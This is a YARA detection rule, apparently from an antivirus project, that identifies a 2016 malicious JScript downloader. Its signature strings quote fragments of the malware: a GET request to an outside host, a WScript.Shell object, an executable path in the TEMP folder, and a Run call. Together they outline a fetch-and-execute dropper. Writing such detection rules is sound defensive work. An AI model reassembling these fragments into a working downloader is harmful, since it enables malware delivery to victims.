rule sig_20160330_697026981f4549680b286f94c8de2696 {
  meta:
    description = "datamaliciousorder - file 20160330_697026981f4549680b286f94c8de2696.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6d7cd46d0ba84f645f6fe54ac370b6d6c6fa9766a82358151fb64282806ae776"

  strings:
    $s1  = "_BQ[_F](\"GET\", \"http://mentalmathcompetition.com/k4isa\", false);" fullword ascii
    $s2  = "var _N1 = function _DT() {return WScript[_O](\"WScript\"+\".Shell\");}(), _C = 11;" fullword ascii
    $s3  = "function _L(_C0, _WB){_WS = _WS * 1; return _C0 - _WB;};" fullword ascii
    $s4  = "if (_BQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _T(){return _V + \"\";};" fullword ascii
    $s6  = "function _M() {return _N1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"38iiC9G4XjFne.ex\" + \"e\";};" fullword ascii
    $s7  = "function _N(_Y1){_N1[\"Run\"](_Y1, _WS, _WS);};" fullword ascii
    $s8  = "function _I() {return ((_O0 == true) && (_O0 == _Q)) ? 1 : _WS;};" fullword ascii
    $s9  = "function _B()" fullword ascii
    $s10 = "function _K(){return 22;};" fullword ascii
    $s11 = "var _R = new this[\"Date\"]();" fullword ascii
    $s12 = "return _L(_RL, _I0);" fullword ascii
    $s13 = "function _E(_Y) {var _Y0 = (1, 2, 3, 4, 5, _Y); return _Y0;};" fullword ascii
    $s14 = " while (_JA){" fullword ascii
    $s15 = "function _J(){return _O;};" fullword ascii
    $s16 = "_Q = true; " fullword ascii
    $s17 = "var _Q = false;" fullword ascii
    $s18 = "var _O0 = false;" fullword ascii
    $s19 = "_O0 = true; " fullword ascii
    $s20 = "var _NS = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}